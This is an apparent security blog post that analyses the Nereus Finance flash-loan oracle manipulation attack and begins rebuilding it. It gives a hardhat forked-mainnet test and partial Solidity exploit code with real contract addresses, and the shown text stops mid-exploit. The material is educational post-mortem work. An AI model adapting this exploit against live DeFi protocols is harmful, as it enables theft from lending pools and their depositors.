---
layout: post
title: 	"Nereus Finance Flashloan Attack Analysed and Exploited"
date:	2022-11-19 00:50:00 +0800
categories: blockchain
---

# Introduction

I was scrolling through the [@PeckShieldAlert](https://twitter.com/PeckShieldAlert) and [@CertiKAlert](https://twitter.com/CertiKAlert) twitter accounts, looking for a complicated looking price manipulation style attack to try to analyse and recreate (one that hadn't already been analysed before). My main goals were as follows:

1. Find a complex transaction to analyse so I can actually learn about all the different ways a transaction can be analysed. For example, I had no idea what a "topic" was in a transaction log before, but now I do!

2. Learn about a new type of protocol to expand my knowledge depth of the whole smart contract ecosystem. In this case, I learned about a lending / borrowing protocol, as well as the Curve.fi ecosystem (more specifically the stableswap pools and the AMM side of things).

Aside from the above, I didn't really know what an attack like this would look like, but after a while of scrolling, [this tweet caught my eye](https://twitter.com/CertiKAlert/status/1567314528357990401). I'd learned about flash loan attacks from solving the Damn Vulnerable Defi challenges. I had a quick look at [the attack transaction](https://snowtrace.io/tx/0x0ab12913f9232b27b0664cd2d50e482ad6aa896aeb811b53081712f42d54c026), and noticed this:

![nereus1.png](/images/nereus/nereus1.png)

70 logs from a single attack? That seemed complex enough, so I dove right in.

#### Skip ahead to the ["How prices are calculated when borrowing NXUSD"](/2022-11-19-nereus-finance-flashloan-attack-analysis#how-prices-are-calculated-when-borrowing-nxusd) section if you are already familiar with lending / borrowing protocols.

# What is Nereus Finance?

Nereus Finance is essentially a lending / borrowing protocol where users are able to:

1. Deposit their tokens as liquidity for other users to borrow from. They earn interest on their deposited tokens (usually in the form of a separate reward token).

2. Borrow money from the market, providing collateral in the process.

Now, for anyone who doesn't know what "collateral" means (I know I didn't), it is an asset (or assets) of any kind that you provide before being able to secure a loan. If you end up defaulting on your loan repayment, the market will get to keep your collateral. Otherwise, you have the option of repaying the loan and repossessing the collateral in the process.

For example, in the real world, if you were to purchase a car through a loan, the collateral can be other assets that you own, or (in most cases) the car itself. If you default on your car loan, the bank can claim the assets (in this case, your car) that you put up as collateral. If you're able to repay the loan, you get to keep your car (and / or repossess any collateral you may have provided).

# Why would you ever borrow tokens in crypto?

There are actually many reasons to borrow tokens in crypto, and a lot of them depend on the platform you're borrowing from. In this post however, I'm focusing on Nereus Finance, specifically their NXUSD token.

NXUSD is intended to be a stable coin alternative to USDC (i.e it is pegged to the price of USDC). One of the main methods to acquiring NXUSD is by borrowing it (the other is by swapping it between its liquidity pools, more on that below), but in order to do that, you need to provide collateral in the process. This collateral is in the form of tokens (of a different type). You can see a full list of the available types of collateral tokens [here](https://app.nereus.finance/#/borrow). Note that the ".e" tokens (i.e USDC.e, WETH.e, etc) are Avalanche's bridged versions of the original tokens.

The main purpose of NXUSD is to [stake it](https://app.nereus.finance/#/staking), gaining WXT in the process as a reward. I've attached a screenshot below since you're required to connect your wallet to see this screen:

![nereus2.png](/images/nereus/nereus2.png)

Here, NXUSD-3CRV and WXT-NXUSD are LP (Liquidity Pool) tokens. 

# What is a Liquidity Pool?

Liquidity pools are the main method through which a user can exchange one token for another. Liquidity providers are able to "add liquidity" to the pool in the form of the tokens the pool comprises of (in the above case, NXUSD and 3CRV), and they would get back a liquidity pool token (in the above case, NXUSD-3CRV). This is a "pair" token, which can then be used in a variety of ways (depending on the type of the token). Some of these cases may be:

- Staking to earn more of another token
- Used as collateral to borrow another token
- etc...

In this case, NXUSD-3CRV is the LP token given to the liquidity providers of NXUSD-3CRV liquidity pool. As you can see, one use case here is to stake this token for further yields at a (current) rate of 33.75% APR, which is decent.

Since the liquidity pool is comprised of individual tokens (in the above case, NXUSD and 3CRV), other users are able to swap one token in the pool for another. They simply give the pool token A, and get back an equal amount of token B.

# How prices for tokens are calculated in a liquidity pool

Above, I mentioned how users are able to swap one token for another through a liquidity pool. Before diving into the attack, the last thing we need to talk about is how the price of a token is calculated when exchanging it for another token in the same liquidity pool.

The way this is done is by checking the ratio of token A in the liquidity pool with token B in the liquidity pool. In this case, if the NXUSD:3CRV ratio is 1:1, then you get an equal amount of 3CRV back (i.e 1 NXUSD = 1 3CRV). If the ratio is 2:1, then you get 0.5 3CRV back for 1 NXUSD, and etc. You can think of this as the "exchange rate" between the tokens.

**Important note: this exchange rate is localized to just this liquidity pool. It may very well be the case that NXUSD has a different exchange rate in other liquidity pools. When that happens, [arbitrage opportunities](https://www.investopedia.com/terms/a/arbitrage.asp) arise, which are taken advantage of by arbitragers. This in turn stabilizes the prices in both liquidity pools such that they end up matching.**

# How prices are calculated when borrowing NXUSD

**For those who skipped ahead, NXUSD is a token that Nereus Finance provides to borrowers. This is the token that the attacker bought after manipulating the price of the USDC-WAVAX JLP token, which is the collateral token in this case.**

I mentioned that the only way to acquire NXUSD is to borrow it. In order to do this, you can provide quite a few types of tokens as collateral. I'll use JLP tokens as the collateral token in this case, as its relevant to this attack. 

JLP stands for Joe LP. "Joe" comes from the use of the [Trader Joe decentralized exchange's liquidity pools](https://traderjoexyz.com/pool) to gain these LP tokens. There is one JLP token for each of the liquidity pools, but each LP token has the same symbol: JLP. Any of these tokens can be used to borrow NXUSD. In this example, I'll use the USDC-WAVAX JLP token as it is relevant to this attack. **From here on out, any reference to JLP token assumes that its the USDC-WAVAX JLP token.**

So, how does Nereus Finance determine how much NXUSD you should get when providing JLP tokens as collateral? The answer is that it uses a a separate contract known as a "price oracle".

# Price oracles

It would take a long wall of text to explain what oracles are, so [here is a link to read more about them if you're interested](https://ethereum.org/en/developers/docs/oracles/). 

The functionality of a price oracle is different for different tokens, so to keep things simple, I'll use the example of the USDC-WAVAX JLP token price oracle, whose contract can be found [here](https://snowtrace.io/address/0xf955a6694c6f5629f5ecd514094b3bd450b59000#code):

<pre>
 <code id="htmlViewer" style="color:rgb(77, 77, 76); font-weight:400;background-color:rgb(255, 255, 255);background:rgb(255, 255, 255);display:block;padding: .5em;">contract JLPWAVAXUSDCOracle <span style="color:rgb(137, 89, 168); font-weight:400;">is</span> IOracle {
    function _get() <span style="color:rgb(77, 77, 76); font-weight:400;"><span style="color:rgb(137, 89, 168); font-weight:400;">internal</span> view <span style="color:rgb(66, 113, 174); font-weight:400;">returns</span> (<span style="color:rgb(245, 135, 31); font-weight:400;">uint256</span>)</span> {
        uint256 usdcPrice = uint256(USDC.latestAnswer());
        uint256 avaxPrice = uint256(AVAX.latestAnswer());
        (uint112 wavaxReserve, uint112 usdcReserve, ) = joePair.getReserves();

        uint256 price = (wavaxReserve * avaxPrice + usdcReserve * usdcPrice * <span style="color:rgb(245, 135, 31); font-weight:400;">1e12</span>) / uint256(joePair.totalSupply());

        <span style="color:rgb(137, 89, 168); font-weight:400;">return</span> <span style="color:rgb(245, 135, 31); font-weight:400;">1e26</span> / price;
    }

    <span style="color:rgb(142, 144, 140); font-weight:400;">// Get the latest exchange rate</span>
    <span style="color:rgb(142, 144, 140); font-weight:400;"><span style="color:rgb(142, 144, 140); font-weight:400;">///</span> @inheritdoc IOracle</span>
    <span style="color:rgb(77, 77, 76); font-weight:400;">function <span style="color:rgb(66, 113, 174); font-weight:400;">get</span>(<span style="color:rgb(245, 135, 31); font-weight:400;">bytes calldata</span>) <span style="color:rgb(137, 89, 168); font-weight:400;">public</span> view <span style="color:rgb(137, 89, 168); font-weight:400;">override</span> <span style="color:rgb(66, 113, 174); font-weight:400;">returns</span> (<span style="color:rgb(245, 135, 31); font-weight:400;"><span class="hljs-built_in">bool</span>, uint256</span>)</span> {
        <span style="color:rgb(137, 89, 168); font-weight:400;">return</span> (<span style="color:rgb(245, 135, 31); font-weight:400;">true</span>, _get());
    }
    
    <span style="color:rgb(142, 144, 140); font-weight:400;">// ...</span>
}</code></pre>

In the above code, the `_get()` function first gets the prices of USDC and AVAX (the unwrapped version of WAVAX) from some external source. **It is important to note that this external source is NOT affected by the price of USDC or AVAX that is localized within the USDC-AVAX liquidity pool.** 

Then, it gets the amount of USDC and WAVAX tokens within the JLP token's liquidity pool (the "reserves"). It then subsequently returns the exchange rate of the JLP token.

# The "vulnerability"

I say "vulnerability" in quotes because there isn't *really* a vulnerability, the price calculation is actually correct. There is something wrong here though, and the best way it can be described as is "forgetting a possible scenario".

See, this price calculation does not account for the fact that a person with a ton (see: shit loads) of money can manipulate the price that is returned very easily. Remember that `usdcPrice` and `avaxPrice` aren't dependent on the ratio of USDC to WAVAX within the JLP token's pool, because they are prices that are fetched external to the pool, and the `joePair.totalSupply()` never changes because there is a fixed supply of JLP tokens in circulation at all times.

So, the only variables we can control in this price calculation are the `wavaxReserve` and `usdcReserve` variables. These variables are easily modified by swapping USDC for WAVAX (or vice versa) from the JLP token's liquidity pool. 

I won't go into the maths too much, but for those interested in testing the numbers, the values are as follows before and after the attacker manipulated `wavaxReserve` and `usdcReserve` (we'll get into how they did it later in the exploit section):

Before:

- `wavaxReserve` = 627455668412499914608095
- `usdcReserve` = 12172713447358
- `avaxPrice` = 1852000000
- `usdcPrice` = 100005077
- `totalSupply` = 2122311556331869083

After:

- `wavaxReserve` = 122241918203312658824524
- `usdcReserve` = 62632713447358
- All other variables unchanged

If you attempt to calculate the exchange rate now, you'll see that after the attacker manipulated the reserves, the exchange rate of the JLP token dropped significantly (from 89195951280 to 32701350550). Note that these numbers are in Wei.

What does this mean? Well, lets say the attacker has 1 JLP token (i.e 1e18 in Wei). If they were to use it as collateral to borrow NXUSD tokens, we get:

- Before price manipulation: 1e18 / 89195951280 = 11,211,271 NXUSD
- After price manipulation: 1e18 / 32701350550 = 30,579,776 NXUSD

Note that the above NXUSD values are not in Wei, they are the actual amount of NXUSD tokens the attacker gets back. 

The most important thing to note here is that it doesn't matter if the JLP token exchange rate drops after the NXUSD is borrowed (that's something the system has to deal with, not the user that borrowed the tokens), so the attacker can just get back the money that they spent to manipulate `wavaxReserve` and `usdcReserve`, having lost only the JLP tokens in the process.

So.. as long as the attacker does the following, they'll get way more NXUSD than the amount of collateral they put up:

1. Acquire some JLP tokens at the normal price (localized to the USDC-WAVAX liquidity pool).

2. Lower the exchange rate of the JLP token by swapping a huge amount of USDC for WAVAX.
    - Since the price of WAVAX is higher than the price of USDC, this is better than doing it the other way around.

3. Use the now lowered exchange rate to borrow NXUSD tokens (the attacker is able to borrow more than they would at a normal price due to the lower exchange rate).

4. Swap back the WAVAX for USDC, bringing the exchange rate of the JLP tokens back to normal.

We'll see how they do this in more detail later on in the exploit section, but I want to note something here: **In decentralized finance, no one can force the attacker to repay the borrowed NXUSD. It's up to the attacker to do so if they want to reclaim their collateral. However, there is no need to reclaim the collateral if the amount of tokens they receive is significantly larger than the amount of collateral they provide, which is exactly what happens here due to the price manipulation.**

# So, what is the missed scenario?

I mentioned above that I wouldn't really classify this as a vulnerability, more so a potential scenario that wasn't accounted for.

The reality of it is that most people don't have the amount of capital required to affect the exchange rate significantly. Of course, that doesn't mean these people don't exist, because they do and they would have been able to perform this exact attack at any point in time.

The fix for this issue is to use a Time-Weighted Average Price (TWAP) algorithm. You can read more about it online, but all it does is prevent the price from changing drastically in an instant (which is what happened in this attack). It takes multiple prices from multiple points in time, and weighs them against each other to come to a final price. Using a TWAP algorithm would have prevented this attack.

# Using flash loans for price manipulation

You might be wondering:

> How am I supposed to perform this attack? I don't have anywhere close to the amount of money required to manipulate the price of the JLP token. 

Well, you're in luck. In crypto, there is a type of loan that does not exist in the centralized world that we live in, and that is a [flash loan](https://docs.aave.com/faq/flash-loans).

You can read more about it in the link provided above, but the TL;DR version is that a flash loan is a loan that the user acquires and pays back in the same transaction (usually with an extra fee).

Due to the way transactions works in the EVM, if the loan isn't paid back before the transaction completes, the loaner simply reverts the transaction, and its as if nothing happened in the first place. This also means that flash loans are only available through the use of smart contracts, and as such, only technically capable people (i.e ones that can write smart contracts, deploy them, etc) are able to use these.

In this attack, the attacker uses a flash loan to gain access to 51,000,000 USDC, which he uses to manipulate the price of the JLP token. At the end of the attack, he repays 51,025,000 USDC (a fee of 25,000 USDC), and leaves off with a profit of ~370,000 USDC.

# Analysing the attack transaction

**[I won't go into this in this post. I have (somewhat messy) that I wrote while I was doing this, and you can find them here](https://github.com/farazsth98/real-world-ethereum-hacks-remastered/blob/master/contracts/NereusFlashLoanAttack/NereusFlashLoanAttack.md).**

The TL;DR of the analysis approach I took is to go through every single event, read through every single contract that the attacker calls into, and read the code to figure out what exactly the attacker is doing.

The problem you'll run into is that the events are not sequential (i.e they don't act like a call stack), so sometimes you have to read ahead through multiple events to figure out which contract the attacker actually called into, as that contract may have called into other contracts that are triggering events.

Either way, [have a read of the analysis](https://github.com/farazsth98/real-world-ethereum-hacks-remastered/blob/master/contracts/NereusFlashLoanAttack/NereusFlashLoanAttack.md) and have a go at reading through the logs yourselves with it open. I learned a lot doing that, and I'm sure anyone else would too.

# Replicating the attack

Finally, lets get to replicating the attack. Remember, you can use [my repo](https://github.com/farazsth98/real-world-ethereum-hacks-remastered) as a starting `hardhat` environment if you want to follow along. See my previous blog post on the TempleDAO attack for more information.

## Forking the Avalanche mainnet

I used [QuickNode](https://www.quicknode.com/) to get access to an Avalanche mainnet archive node, so we could go back in time to a point right before the attack happened. See my previous blog post to see how to do this using [Alchemy](https://alchemy.com). The steps are very similar. You can then just copy the HTTPS URL for the node and use it as you please. I put mine inside my `.env` file (see `.env.example` in the repo linked above).

Then, modify the following lines of code inside `hardhat.config.ts` to set the RPC URL to fork from:

```ts
const config: HardhatUserConfig = {
  networks: {
    hardhat: {
      loggingEnabled: false,
      forking: {
        url: AV_ARCHIVE_URL, // Set archive URL here
        blockNumber: 15700000, // we will set this in each test
      },
    },
  },

  // ...
};
```

Finally, we can start our exploit. 

## The `hardhat` test

I'll post the entire `hardhat` test script here and explain some key aspects of it:

```ts
import { expect } from 'chai';
import { Contract, Signer } from 'ethers';
import { ethers } from 'hardhat';
import { getAbi } from '../utils/abi';
import { forkFrom } from '../utils/fork';

describe('Nereus Finance Exploit', async () => {
  let attacker: Signer;
  let attackerContract: Contract;
  let usdcContract: Contract;

  const USDC_ADDRESS = '0xB97EF9Ef8734C71904D8002F8b6Bc66Dd9c48a6E';

  before(async () => {
    // One block before the attack occurred
    await forkFrom(19613452);

    // Get an attacker EOA that we can use
    [attacker] = await ethers.getSigners();

    // Deploy the attacker script
    attackerContract = await (
      await ethers.getContractFactory('NereusFlashLoanAttack', attacker)
    ).deploy();

    const usdc_abi = await getAbi('abis/USDCABI.txt');
    usdcContract = await ethers.getContractAt(usdc_abi, USDC_ADDRESS);

    // NOTE: The code below is used for testing purposes so our flash loan
    // always gets repaid when testing the unfinished exploit.
    //
    // Impersonate the reserve treasury of the contract to send ourselves tokens
    /*const impersonated = await ethers.getImpersonatedSigner(
      '0xb7887fed5e2f9dc1a66fbb65f76ba3731d82341a',
    );

    // We need to send some ETH to the reserve treasury so they can make the
    // transfer transaction. Note the balance has to be in hex for whatever
    // reason. This sends them 5 ETH
    await ethers.provider.send('hardhat_setBalance', [
      '0xb7887fed5e2f9dc1a66fbb65f76ba3731d82341a',
      '0x4563918244f40000',
    ]);

    await usdcContract
      .connect(impersonated)
      .configureMinter(attacker.getAddress(), ethers.utils.parseEther('100000000'));

    await usdcContract
      .connect(attacker)
      .mint(attackerContract.address, ethers.utils.parseUnits('100000000', 6));*/
  });

  it('Exploits successfully', async () => {
    // Run our exploit
    const beforeBalance = await usdcContract.balanceOf(attackerContract.address);
    console.log(`[+] USDC Balance before exploit: ${beforeBalance / 1e6}`);

    await attackerContract.exploit();

    const afterBalance = await usdcContract.balanceOf(attackerContract.address);
    console.log(`[+] USDC Balance before exploit: ${afterBalance / 1e6}`);

    expect(beforeBalance).to.be.lt(afterBalance);
  });
});
```

Please read my post on the TempleDAO attack for more context on some of the code above if you've never used `hardhat` before.

- The commented out code from line 252 to 270 is used to impersonate the treasury account of the USDC token (i.e an account that has a ton of USDC). I used this to transfer 100,000,000 USDC to my contract so that the flash loan in the attack (see below) would always get repaid while writing the exploit.

    - I needed to do this because my attack contract had a `test()` function that simply returned the value of some variable from within my exploit. I used this for debugging purposes. A `console.log()` after a call to my `attackerContract` would fail if the call reverted.

- The block I forked from is exactly 1 block before the attacker transaction's block.

# The exploit

I will replicate the attacker's steps as close as possible. [You can see the final exploit here](https://github.com/farazsth98/real-world-ethereum-hacks-remastered/blob/master/contracts/NereusFlashLoanAttack/NereusFlashLoanAttack.sol). I will be skipping a lot of the unnecessary code in an effort to save space.

First, lets start off with the boilerplate:

<pre>
 <code id="htmlViewer" style="color:rgb(77, 77, 76); font-weight:400;background-color:rgb(255, 255, 255);background:rgb(255, 255, 255);display:block;padding: .5em;"><span style="color:rgb(234, 183, 0); font-weight:400;">contract</span> NereusFlashLoanAttack {
  <span style="color:rgb(234, 183, 0); font-weight:400;">IERC20</span> usdc = IERC20(0xB97EF9Ef8734C71904D8002F8b6Bc66Dd9c48a6E);
  <span style="color:rgb(234, 183, 0); font-weight:400;">IERC20</span> nxusd = IERC20(0xF14f4CE569cB3679E99d5059909E23B07bd2F387);
  <span style="color:rgb(234, 183, 0); font-weight:400;">IERC20</span> wavax = IERC20(0xB31f66AA3C1e785363F0875A1B74E27b85FD66c7);
  <span style="color:rgb(234, 183, 0); font-weight:400;">IERC20</span> usdce = IERC20(0xA7D7079b0FEaD91F3e65f86E8915Cb59c1a4C664);
  <span style="color:rgb(234, 183, 0); font-weight:400;">IERC20</span> wavaxusdc = IERC20(0xf4003F4efBE8691B60249E6afbD307aBE7758adb);
  <span style="color:rgb(234, 183, 0); font-weight:400;">IDegenBox</span> degenbox = IDegenBox(0x0B1F9C2211F77Ec3Fa2719671c5646cf6e59B775);
  <span style="color:rgb(234, 183, 0); font-weight:400;">ICauldronV2</span> cauldron = ICauldronV2(0xC0A7a7F141b6A5Bce3EC1B81823c8AFA456B6930);
  <span style="color:rgb(234, 183, 0); font-weight:400;">address</span> masterCauldron = 0xE767C6C3Bf42f550A5A258A379713322B6c4c060;
  <span style="color:rgb(234, 183, 0); font-weight:400;">ITraderJoeRouter</span> router = ITraderJoeRouter(0x60aE616a2155Ee3d9A68541Ba4544862310933d4);
  <span style="color:rgb(234, 183, 0); font-weight:400;">IFlashLoaner</span> flashLoaner = IFlashLoaner(0x794a61358D6845594F94dc1DB02A252b5b4814aD);
  <span style="color:rgb(234, 183, 0); font-weight:400;">address</span> nxusd3crv = 0x6BF6fc7EaF84174bb7e1610Efd865f0eBD2AA96D;
  <span style="color:rgb(234, 183, 0); font-weight:400;">ICurveStablePool</span> usdceusdc = ICurveStablePool(0x3a43A5851A3e3E0e25A3c1089670269786be1577);
  <span style="color:rgb(234, 183, 0); font-weight:400;">ICurveMeta</span> curvemeta = ICurveMeta(0x001E3BA199B4FF4B5B6e97aCD96daFC0E2e4156e);

  <span style="color:rgb(234, 183, 0); font-weight:400;">function</span> exploit() public {}
}</code></pre>

I get access to all the required contracts and store them in the storage variables. The interfaces are defined in the real exploit script linked above.

The `exploit()` function is what the `hardhat` test calls to start the exploit.

### Step 1: Approving the required contracts

First, I'll approve multiple contracts to spend multiple tokens on my behalf. This lets those contracts transfer these tokens out of my contract, which is required for a lot of the upcoming steps:

<pre>
 <code id="htmlViewer" style="color:rgb(77, 77, 76); font-weight:400;background-color:rgb(255, 255, 255);background:rgb(255, 255, 255);display:block;padding: .5em;">function exploit() public {
  <span style="color:rgb(142, 144, 140); font-weight:400;">// Approve USDC and WAVAX on the Trader Joe router</span>
  usdc<span style="color:rgb(200, 40, 41); font-weight:400;">.approve</span>(address(router), type(uint256)<span style="color:rgb(200, 40, 41); font-weight:400;">.max</span>);
  wavax<span style="color:rgb(200, 40, 41); font-weight:400;">.approve</span>(address(router), type(uint256)<span style="color:rgb(200, 40, 41); font-weight:400;">.max</span>);

  <span style="color:rgb(142, 144, 140); font-weight:400;">// Approve USDC for the flash loaner pool so it can make us repay the</span>
  <span style="color:rgb(142, 144, 140); font-weight:400;">// flashloan</span>
  usdc<span style="color:rgb(200, 40, 41); font-weight:400;">.approve</span>(address(flashLoaner), type(uint256)<span style="color:rgb(200, 40, 41); font-weight:400;">.max</span>);

  <span style="color:rgb(142, 144, 140); font-weight:400;">// Approve WAVAX/USDC LP tokens for the DegenBox so it lets us deposit</span>
  <span style="color:rgb(142, 144, 140); font-weight:400;">// to it</span>
  wavaxusdc<span style="color:rgb(200, 40, 41); font-weight:400;">.approve</span>(address(degenbox), type(uint256)<span style="color:rgb(200, 40, 41); font-weight:400;">.max</span>);

  <span style="color:rgb(142, 144, 140); font-weight:400;">// Approve NXUSD for the CurveMeta contract so it can take it from us when</span>
  <span style="color:rgb(142, 144, 140); font-weight:400;">// we attempt to exchange NXUSD</span>
  nxusd<span style="color:rgb(200, 40, 41); font-weight:400;">.approve</span>(address(curvemeta), type(uint256)<span style="color:rgb(200, 40, 41); font-weight:400;">.max</span>);

  <span style="color:rgb(142, 144, 140); font-weight:400;">// Approve USDC.e for the USDC.e - USDC stable swap curve pool so we can</span>
  <span style="color:rgb(142, 144, 140); font-weight:400;">// exchange our USDC.e for USDC in the end</span>
  usdce<span style="color:rgb(200, 40, 41); font-weight:400;">.approve</span>(address(usdceusdc), type(uint256)<span style="color:rgb(200, 40, 41); font-weight:400;">.max</span>);

  <span style="color:rgb(142, 144, 140); font-weight:400;">// Approve USDC.e for the Trader Joe router for the same reason above</span>
  usdce<span style="color:rgb(200, 40, 41); font-weight:400;">.approve</span>(address(router), type(uint256)<span style="color:rgb(200, 40, 41); font-weight:400;">.max</span>);

  <span style="color:rgb(142, 144, 140); font-weight:400;">// Allow the CauldronV2 master contract to make transactions (i.e decisions)</span>
  <span style="color:rgb(142, 144, 140); font-weight:400;">// for us. This is required when we attempt to borrow NXUSD, as we have</span>
  <span style="color:rgb(142, 144, 140); font-weight:400;">// to make calls to the CauldronV2 contract and allow it to make calls to</span>
  <span style="color:rgb(142, 144, 140); font-weight:400;">// the DegenBox contract for us.</span>
  degenbox<span style="color:rgb(200, 40, 41); font-weight:400;">.setMasterContractApproval</span>(address(this), masterCauldron, true, 0, 0, 0);
}</code></pre>

The master contract approval at the end is interesting, and will be explained further below. The TL;DR version is that it allows us to borrow NXUSD later on.

### Step 2: Flash Loan

The attacker starts off by getting 51,000,000 USDC through a flash loan. They use [this contract](https://snowtrace.io/address/0xdf9e4abdbd94107932265319479643d3b05809dc) to do it ([proxy contract here](https://snowtrace.io/address/0x794a61358d6845594f94dc1db02a252b5b4814ad)), specifically the `flashLoanSimple()` function within the `Pool.sol` contract.

The `flashLoanSimple()` function calls into `executeFlashLoanSimple()` within the `FlashLoanLogic.sol` contract (at the same address above). Within here, we can see that the contract will send us the tokens we request, and then call a callback function on a contract we specify. This callback function is called `executeOperation()`.

Knowing all of this, we can get a flash loan by doing the following:

<pre>
 <code id="htmlViewer" style="color:rgb(77, 77, 76); font-weight:400;background-color:rgb(255, 255, 255);background:rgb(255, 255, 255);display:block;padding: .5em;"><span style="color:rgb(77, 77, 76); font-weight:400;">function <span style="color:rgb(66, 113, 174); font-weight:400;">exploit</span>(<span style="color:rgb(245, 135, 31); font-weight:400;"></span>) <span style="color:rgb(137, 89, 168); font-weight:400;">public</span></span> {
  <span style="color:rgb(142, 144, 140); font-weight:400;">// ...</span>
  
  <span style="color:rgb(142, 144, 140); font-weight:400;">// Now, lets get the flash loan for 51 million USDC. This calls</span>
  <span style="color:rgb(142, 144, 140); font-weight:400;">// `executeOperation()` below.</span>
  flashLoaner.flashLoanSimple(address(<span style="color:rgb(137, 89, 168); font-weight:400;">this</span>), address(usdc), <span style="color:rgb(245, 135, 31); font-weight:400;">51000000e6</span>, <span style="color:rgb(113, 140, 0); font-weight:400;">&#x27;&#x27;</span>, <span style="color:rgb(245, 135, 31); font-weight:400;">0</span>);
}

<span style="color:rgb(77, 77, 76); font-weight:400;">function <span style="color:rgb(66, 113, 174); font-weight:400;">executeOperation</span>(<span style="color:rgb(245, 135, 31); font-weight:400;">
  address,
  uint256,
  uint256,
  address,
  bytes calldata
</span>) <span style="color:rgb(137, 89, 168); font-weight:400;">public</span> <span style="color:rgb(66, 113, 174); font-weight:400;">returns</span> (<span style="color:rgb(245, 135, 31); font-weight:400;"><span class="hljs-built_in">bool</span></span>)</span> {}</code></pre>

One thing to note here is that the USDC token has 6 decimal places, hence the `51000000e6` when getting the loan.

We also don't have to repay the flash loan ourselves, as `executeFlashLoanSimple()` from `FlashLoanLogic.sol` will call into a `_handleFlashLoanRepayment()` function that retrieves the tokens from our account automatically. This is why we had to approve this contract to spend USDC for us.

**To reiterate, we will have access to our flash loan as long as we're executing inside `executeOperation()`. As soon as this function finishes executing, we'll be forced to repay the loan, and if we aren't able to (i.e not enough funds), the entire transaction reverts.**

### Step 3: Acquire JLP tokens before price manipulation

The attacker now acquires a small amount of JLP tokens prior to manipulating the price. They do this by:

1. Swapping 280,000 USDC for WAVAX tokens using the [Trader Joe Router contract](https://snowtrace.io/address/0x60aE616a2155Ee3d9A68541Ba4544862310933d4).
2. Adding 260,000 USDC and as much WAVAX as possible to the USDC-WAVAX JLP token's liquidity pool. We can achieve this as follows:

<pre>
 <code id="htmlViewer" style="color:rgb(77, 77, 76); font-weight:400;background-color:rgb(255, 255, 255);background:rgb(255, 255, 255);display:block;padding: .5em;"><span style="color:rgb(77, 77, 76); font-weight:400;">function <span style="color:rgb(66, 113, 174); font-weight:400;">executeOperation</span><span style="color:rgb(245, 135, 31); font-weight:400;">(
  <span style="color:rgb(142, 144, 140); font-weight:400;">// ...</span>
)</span> <span style="color:rgb(137, 89, 168); font-weight:400;">public</span> <span style="color:rgb(66, 113, 174); font-weight:400;">returns</span> <span style="color:rgb(245, 135, 31); font-weight:400;">(<span style="color:rgb(137, 89, 168); font-weight:400;">bool</span>)</span> </span>{
  <span style="color:rgb(142, 144, 140); font-weight:400;">// Step 1: Swap 280,000 USDC for as much WAVAX as possible</span>
  address[] memory path = <span style="color:rgb(137, 89, 168); font-weight:400;">new</span> address[](<span style="color:rgb(245, 135, 31); font-weight:400;">2</span>);
  path[<span style="color:rgb(245, 135, 31); font-weight:400;">0</span>] = <span style="color:rgb(245, 135, 31); font-weight:400;">address</span>(usdc);
  path[<span style="color:rgb(245, 135, 31); font-weight:400;">1</span>] = <span style="color:rgb(245, 135, 31); font-weight:400;">address</span>(wavax);

  router.<span style="color:rgb(245, 135, 31); font-weight:400;">swapExactTokensForTokens</span>(<span style="color:rgb(245, 135, 31); font-weight:400;">280000e6</span>, <span style="color:rgb(245, 135, 31); font-weight:400;">1</span>, path, <span style="color:rgb(245, 135, 31); font-weight:400;">address</span>(<span style="color:rgb(137, 89, 168); font-weight:400;">this</span>), block.timestamp * <span style="color:rgb(245, 135, 31); font-weight:400;">5</span>);

  <span style="color:rgb(142, 144, 140); font-weight:400;">// Step 2: Add 260,000 USDC and as much WAVAX as possible into the WAVAX/USDC LP pool</span>
  router.<span style="color:rgb(245, 135, 31); font-weight:400;">addLiquidity</span>(
    <span style="color:rgb(245, 135, 31); font-weight:400;">address</span>(usdc),
    <span style="color:rgb(245, 135, 31); font-weight:400;">address</span>(wavax),
    <span style="color:rgb(245, 135, 31); font-weight:400;">260000e6</span>,
    wavax.<span style="color:rgb(245, 135, 31); font-weight:400;">balanceOf</span>(<span style="color:rgb(245, 135, 31); font-weight:400;">address</span>(<span style="color:rgb(137, 89, 168); font-weight:400;">this</span>)),
    <span style="color:rgb(245, 135, 31); font-weight:400;">1</span>,
    <span style="color:rgb(245, 135, 31); font-weight:400;">1</span>,
    <span style="color:rgb(245, 135, 31); font-weight:400;">address</span>(<span style="color:rgb(137, 89, 168); font-weight:400;">this</span>),
    block.timestamp * <span style="color:rgb(245, 135, 31); font-weight:400;">5</span>
  );
}</code></pre>

To understand how to call these functions, you can check the code in the router contract (linked above).

The contract will now gain 0.04533097793130507 JLP tokens. Remember that we just purchased this at the normal, unmanipulated market price.

### Step 4: Price manipulation

The attacker now exchanges all of the USDC they have left (50,460,000 USDC) for as much WAVAX as possible. This will cause the amount of USDC in the pool to increase significantly, whilst decreasing the amount of WAVAX in it. The attacker likely chose the initial amount to flash loan based on the state of the current JLP liquidity pool.

[You can check 'The "vulnerability"' section to see how the amount of USDC and WAVAX are affected by this step](/2022-11-19-nereus-finance-flashloan-attack-analysis/#the-vulnerability).

We can achieve this step by doing the following:

<pre>
 <code id="htmlViewer" style="color:rgb(77, 77, 76); font-weight:400;background-color:rgb(255, 255, 255);background:rgb(255, 255, 255);display:block;padding: .5em;"><span style="color:rgb(77, 77, 76); font-weight:400;">function <span style="color:rgb(66, 113, 174); font-weight:400;">executeOperation</span><span style="color:rgb(245, 135, 31); font-weight:400;">(
  <span style="color:rgb(142, 144, 140); font-weight:400;">// ...</span>
)</span> <span style="color:rgb(137, 89, 168); font-weight:400;">public</span> <span style="color:rgb(66, 113, 174); font-weight:400;">returns</span> <span style="color:rgb(245, 135, 31); font-weight:400;">(<span style="color:rgb(137, 89, 168); font-weight:400;">bool</span>)</span> </span>{
  <span style="color:rgb(142, 144, 140); font-weight:400;">// ...</span>
  
  <span style="color:rgb(142, 144, 140); font-weight:400;">// Step 3: Swap the remaining flashloaned USDC for as much WAVAX as possible.</span>
  <span style="color:rgb(142, 144, 140); font-weight:400;">// This will drive up the price of WAVAX by a huge amount.</span>
  <span style="color:rgb(142, 144, 140); font-weight:400;">//</span>
  <span style="color:rgb(142, 144, 140); font-weight:400;">// Due to the bug in the oracle, this will lower the exchange rate that&#x27;s</span>
  <span style="color:rgb(142, 144, 140); font-weight:400;">// used to borrow NXUSD with WAVAX/USDC LP as a collateral significantly,</span>
  <span style="color:rgb(142, 144, 140); font-weight:400;">// which allows us to borrow a lot more than normal market price.</span>
  router.<span style="color:rgb(245, 135, 31); font-weight:400;">swapExactTokensForTokens</span>(
